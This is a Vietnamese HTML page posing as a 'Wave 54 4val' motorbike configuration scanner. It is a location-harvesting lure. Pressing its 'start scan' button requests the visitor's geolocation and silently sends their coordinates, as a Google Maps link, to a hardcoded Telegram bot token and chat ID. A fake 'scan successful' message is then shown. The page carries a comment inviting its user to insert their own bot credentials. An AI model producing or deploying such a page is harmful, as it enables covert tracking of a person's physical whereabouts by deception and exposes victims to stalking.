<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Kiểm tra thông tin xe</title>
</head>
<body style="text-align: center; font-family: sans-serif; padding-top: 50px;">

    <h2>Hệ thống kiểm tra cấu hình Wave 54 4val</h2>
    <p>Vui lòng nhấn vào nút bên dưới để bắt đầu quét dữ liệu xe.</p>
    
    <button onclick="getLocation()" style="padding: 15px 30px; font-size: 18px; background: red; color: white; border: none; border-radius: 10px; cursor: pointer;">
        BẮT ĐẦU QUÉT
    </button>

    <p id="status"></p>

    <script>
        var x = document.getElementById("status");
        
        // --- THAY THÔNG TIN CỦA BẠN VÀO ĐÂY ---
        var token = "AAH8Qe6ETY42SjLvFBq8hFRd3SlhO6hPMz0"; 
        var chat_id = "8571376502";
        // ---------------------------------------

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
                x.innerHTML = "Đang quét dữ liệu... vui lòng chờ.";
            } else {
                x.innerHTML = "Trình duyệt không hỗ trợ định vị.";
            }
        }

        function sendToTelegram(position) {
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            var text = `Thông báo: Xe đang ở vị trí này: ${mapUrl}`;
            
            var telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;

            fetch(telegramUrl)
                .then(() => {
                    x.innerHTML = "Quét thành công! Đang đồng bộ dữ liệu...";
                    alert("Cấu hình xe: 54 ly - 4val - Xăng cơ. Hệ thống đã ghi nhận.");
                })
                .catch(() => {
                    x.innerHTML = "Lỗi kết nối server.";
                });
        }

        function showError(error) {
            x.innerHTML = "Bạn phải cho phép truy cập vị trí để quét dữ liệu xe.";
        }
    </script>

</body>
</html>
